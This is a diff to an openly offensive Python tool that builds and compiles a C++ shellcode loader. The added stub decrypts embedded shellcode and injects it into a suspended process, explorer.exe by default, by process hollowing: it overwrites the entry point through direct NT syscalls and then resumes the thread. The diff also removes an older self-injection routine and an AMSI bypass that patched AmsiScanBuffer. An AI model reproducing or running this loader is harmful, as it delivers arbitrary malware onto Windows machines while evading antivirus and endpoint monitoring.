@@ -16,8 +16,9 @@ inspiration = """
 stub = """
 #include <iostream>
 #include <windows.h>
-#include "Syscalls.h"
 #include <psapi.h>
+#include <winternl.h>
+#include "Syscalls.h"
 #ifndef UNICODE  
 typedef std::string String;
 #else
@@ -26,7 +27,7 @@ typedef std::wstring String;
 
 REPLACE_ME_PAYLOAD
 
-unsigned int payload_len = sizeof(payload) / sizeof(payload[0]);
+unsigned int payload_len = sizeof(payload);
 
 unsigned char* decoded = (unsigned char*)malloc(payload_len);
 
@@ -36,14 +37,16 @@ int PrintModules(DWORD processID)
     HANDLE hProcess;
     DWORD cbNeeded;
     unsigned int i;
+    OBJECT_ATTRIBUTES oa;
+    CLIENT_ID cid;
+
+    cid.UniqueProcess = processID;
 
     // Print the process identifier.
     //printf("\\nProcess ID: %u\\n", processID);
 
     // Get a handle to the process.
-    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_READ,
-        FALSE, processID);
+    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
     if (NULL == hProcess)
         return 1;
 
@@ -74,7 +77,7 @@ int PrintModules(DWORD processID)
     }
 
     // Release the handle to the process.
-    CloseHandle(hProcess);
+    NtClose(hProcess);
     return 0;
 }
 
@@ -131,77 +134,153 @@ int deC(unsigned char payload[])
 
 int main()
 {
-    HANDLE hProc = GetCurrentProcess();
-    DWORD oldprotect = 0;
-    PVOID base_addr = NULL;
-    HANDLE thandle = NULL;
-    SIZE_T bytesWritten;
-
     getLoadedDlls();
-    AMSI_BYPASS
     deC(payload);
 
-    // Allocate memory in the current proccess
-    NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, 0x40);
-    // Write the decrypted shellcode to the allocated memory
-    NTSTATUS NTWVM = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);
-    // Set permission on allocated memory as PAGE_NOACCESS
-    NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);
-    // Create thread in suspended state
-    NTSTATUS ct = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);
-    // Sleep for 3 seconds for AV to scan suspened thread... Idk if this actually does anything so may remove it in new updates.
-    Sleep(3000);
-    // Set permission on allocated memory as PAGE_EXECUTE_READ
-    NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
-    // Resuming Thread
-    NtResumeThread(thandle, 0);
-    NtWaitForSingleObject(thandle, -1, NULL);
-    // Free allocated memory
-    NtFreeVirtualMemory(hProc, base_addr, 0, MEM_RELEASE | MEM_DECOMMIT);
-    NtFreeVirtualMemory(hProc, &decoded, 0, MEM_RELEASE | MEM_DECOMMIT);
+    STARTUPINFO *si = (STARTUPINFO *)malloc(sizeof(STARTUPINFO));
+    PROCESS_INFORMATION *pi = (PROCESS_INFORMATION *)malloc(sizeof(PROCESS_INFORMATION));
+    ZeroMemory(si, sizeof(STARTUPINFO));
+    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
+
+    LPCSTR processImage = "REPLACE_ME_PROCESS";
+    NTSTATUS res = CreateProcess(NULL, processImage, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, si, pi);
+
+    if (res == 0) {
+        std::cout << "Create process FAILED to start: " << std::hex << res << std::endl;
+        printf("CreateProcess failed (%d).\\n", GetLastError());
+        return 0;
+    }
+    else {
+        std::cout << "Create proccess started sucessfully." << std::endl;
+    }
+
+    HANDLE hProcess = pi->hProcess;
+    PROCESS_BASIC_INFORMATION bi;
+    ULONG tmp;
+
+    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);
+
+    if (res != 0){
+        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else {
+        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
+    }
+
+    __int64 TEST = (__int64)bi.PebBaseAddress;
+    __int64 TEST2 = TEST + 0x10;
+    PVOID ptrImageBaseAddress = (PVOID)TEST2;
+
+    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
+    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;
+
+    PVOID baseAddressBytes;
+    unsigned char data[513];
+    SIZE_T nBytes;
+
+    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);
+
+    if (res != 0){
+        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
+    }
+
+    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;
+
+    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);
+
+    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);
+
+    if (res != 0){
+        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
+        std::cout << "nBytes: " << nBytes << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
+    }
+    
+    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
+    std::cout << "e_lfanew: " << e_lfanew << std::endl;
+    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
+    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
+    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
+    std::cout << "entrypointRva: " << entrypointRva << std::endl;
+    __int64 rvaconv = (__int64)imageBaseAddress;
+    __int64 rvaconv2 = rvaconv + entrypointRva;
+    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
+    PVOID entrypointAddress = (PVOID)rvaconv2;
+
+    ULONG oldprotect;
+    SIZE_T bytesWritten;
+    SIZE_T shellcodeLength = (SIZE_T)payload_len;
+
+    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);
+
+    if (res != 0){
+        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
+    }
+
+    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);
+
+    if (res != 0){
+        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
+    }
+
+    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
+    if (res != 0){
+        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
+    }
+
+    res = NtResumeThread(pi->hThread, &tmp);
+    if (res != 0){
+        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
+        return 0;
+    }
+    else{
+        std::cout << "NtProtectVirtualMemory resumed thread successfully." << std::endl;
+    }
+
+    res = NtClose(hProcess);
 }"""
 
-amsi_bypass = """
-    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
-    try {
-        DWORD oldProtect, newProtect;
-        SIZE_T numBytes;
-        int patch_len = 6;
-        HMODULE hmodule = LoadLibrary(TEXT("amsi.dll"));
-        if (hmodule == NULL)
-        {
-            std::cout << "[+] Failed to load amsi.dll" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        PVOID addr = GetProcAddress(hmodule, "AmsiScanBuffer");
-        PVOID oldaddr = addr;
-        if (addr == NULL)
-        {
-            std::cout << "[+] Failed to get the address of AmsiScanBuffer" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        // I tried doing this with NtProtectVirtualMemory, but the patch didn't seem to be effective :(
-        VirtualProtect(addr, patch_len, 0x40, &oldProtect);
-        NtWriteVirtualMemory(hProc, addr, patch, patch_len, &numBytes);
-        VirtualProtect(addr, patch_len, oldProtect, newProtect);
-        std::cout << "[+] Successfully Patched AMSI" << std::endl;
-    }
-    catch (...) {
-        std::cout << "[+] Patching AMSI Failed!" << std::endl;
-    }
-"""
 
 def generateKey():
     letters = string.ascii_letters + string.digits
     key = ''.join(random.choice(letters) for i in range(49))
     return key
 
-def main(stub, infile, outfile, key, amsi):
+def main(stub, infile, outfile, key, process):
     print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
-    file = open(infile, 'rb')
+    #Take infile and add 5000 nops to shellcode.
+    #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
+    #If you know why this is happening, feel free to reach out to me!
+    with open(infile, 'rb') as contents:
+        save = contents.read()
+    tempfile = "temp_{}".format(infile)
+    with open(tempfile, 'wb') as contents:
+        contents.write(b"\x90"*5000)
+        contents.write(save)
+    file = open(tempfile, 'rb')
     contents = file.read()
     file.close()
+    os.system("rm {}".format(tempfile))
 
     encrypted = []
     for b in range(len(contents)):
@@ -222,13 +301,10 @@ def main(stub, infile, outfile, key, amsi):
 
     output += "};"
 
+    print("[+] Using {} for process hollowing".format(process))
     stub = stub.replace("REPLACE_ME_PAYLOAD", output)
     stub = stub.replace("REPLACE_ME_KEY", key)
-    if amsi is True:
-        print("[+] Adding AMSI bypass to stub")
-        stub = stub.replace("AMSI_BYPASS", amsi_bypass)
-    else:
-        stub = stub.replace("AMSI_BYPASS", "")
+    stub = stub.replace("REPLACE_ME_PROCESS", process)
 
     file = open("stub.cpp", "w")
     file.write(stub)
@@ -237,7 +313,7 @@ def main(stub, infile, outfile, key, amsi):
     print("[+] Compiling new stub...")
     os.system("x86_64-w64-mingw32-g++ stub.cpp -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
     if os.path.exists(outfile) == True:
-        print("[!] {} has been compilied successfully!".format(outfile))
+        print("[!] {} has been compiled successfully!".format(outfile))
     else:
         print("[!] Stub compilation failed! Something went wrong!")
     os.system("rm stub.cpp")
@@ -246,7 +322,7 @@ def main(stub, infile, outfile, key, amsi):
 print(inspiration[1:-1])
 parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
 parser.add_argument("file", help="File containing raw shellcode", type=str)
-parser.add_argument('-a', '--amsi', action='store_true', help='Enable AMSI Bypass (Uses VirtualProtect, be careful!)')
+parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
 parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
 if len(sys.argv) < 2:
     parser.print_help()
@@ -256,6 +332,6 @@ try:
     if os.path.exists(args.out) == True:
         os.system("rm {}".format(args.out))
     key = generateKey()
-    main(stub, args.file, args.out, key, args.amsi)
+    main(stub, args.file, args.out, key, args.process)
 except:
     sys.exit()
